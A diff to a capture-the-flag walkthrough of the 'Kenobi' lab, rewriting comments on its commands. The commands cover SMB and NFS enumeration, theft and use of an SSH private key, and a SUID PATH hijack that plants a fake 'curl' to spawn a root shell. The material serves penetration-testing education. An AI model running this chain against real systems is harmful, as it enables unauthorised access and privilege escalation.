@@ -37,14 +37,14 @@ Privilege escalation came from a SUID binary (`/usr/bin/menu`) that called helpe
 Tools: [nmap](../../tools/recon/nmap.md), [smbmap](../../tools/recon/smbmap.md), [smbclient](../../tools/recon/smbclient.md).
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: perform a full port scan and service enumeration.
+# Why here: identify classic Linux services like SMB, NFS, and ProFTPd that form the multi-stage attack surface.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open
 nmap -sVC -p22,80,445,111,2049,37261,40289,42185,54513 $TARGET -oN service
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $TARGET
 smbmap -H $TARGET -u '' -p ''
-# What it does: connects to an SMB resource and optionally executes an action.
-# Why here: listar, descargar o subir archivos por SMB.
+# What it does: connect to the anonymous SMB share.
+# Why here: retrieve the log.txt file which contains sensitive information about the system configuration and ProFTPd.
 smbclient //$TARGET/anonymous
 get log.txt
 ```
@@ -60,17 +60,17 @@ SITE CPTO /var/tmp/id_rsa
 
 ```bash
 mkdir /mnt/kenobiNFS
-# What it does: monta un sistema de archivos remoto o local.
-# Why here: inspeccionar archivos como si estuvieran en local.
+# What it does: mount the target's /var NFS export.
+# Why here: access the /var/tmp directory where the SSH key was copied using the ProFTPd mod_copy vulnerability.
 mount $TARGET:/var /mnt/kenobiNFS
-# What it does: copies or moves a file.
-# Why here: prepare payloads or place loot where the next command expects it.
+# What it does: copy the recovered SSH key from the NFS mount to the local machine.
+# Why here: prepare the private key for authentication to the target system via SSH.
 cp /mnt/kenobiNFS/tmp/id_rsa .
-# What it does: changes permissions or owner.
-# Why here: make a payload executable or control access to a file.
+# What it does: set strict permissions on the recovered private key.
+# Why here: comply with SSH security requirements to enable the key for authentication.
 chmod 600 id_rsa
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: log in as 'kenobi' via SSH using the recovered private key.
+# Why here: obtain a user-level shell on the target to begin local privilege escalation.
 ssh -i id_rsa kenobi@$TARGET
 ```
 
@@ -79,20 +79,20 @@ ssh -i id_rsa kenobi@$TARGET
 Full technique: [SUID PATH hijack](../../exploits/privesc-linux/suid-path-hijack.md).
 
 ```bash
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search the filesystem for SUID binaries.
+# Why here: identify /usr/bin/menu, a custom SUID binary that is vulnerable to PATH hijacking.
 find / -perm -u=s -type f 2>/dev/null
-# What it does: extracts readable strings from a binary or file.
-# Why here: buscar credenciales, rutas o tokens embebidos.
+# What it does: analyze the /usr/bin/menu binary for unqualified command calls.
+# Why here: confirm that the binary calls 'curl' without an absolute path, enabling a PATH hijack attack.
 strings /usr/bin/menu
-# What it does: changes the current directory.
-# Why here: position in the necessary path for the next command.
+# What it does: navigate to the /tmp directory.
+# Why here: prepare to create the malicious helper binary in a world-writable location for the PATH hijack.
 cd /tmp
-# What it does: escribe un comando payload en un archivo o entrada vulnerable.
-# Why here: convertir script/ruta escribible en ejecucion de codigo.
+# What it does: create a malicious 'curl' script in /tmp.
+# Why here: provide a payload that will be executed as root when the SUID binary calls 'curl' via the hijacked PATH.
 echo /bin/sh > curl
-# What it does: changes permissions or owner.
-# Why here: make a payload executable or control access to a file.
+# What it does: make the malicious curl helper executable.
+# Why here: ensure the SUID binary can execute the payload when it triggers the hijacked 'curl' call.
 chmod 777 curl
 export PATH=/tmp:$PATH
 /usr/bin/menu
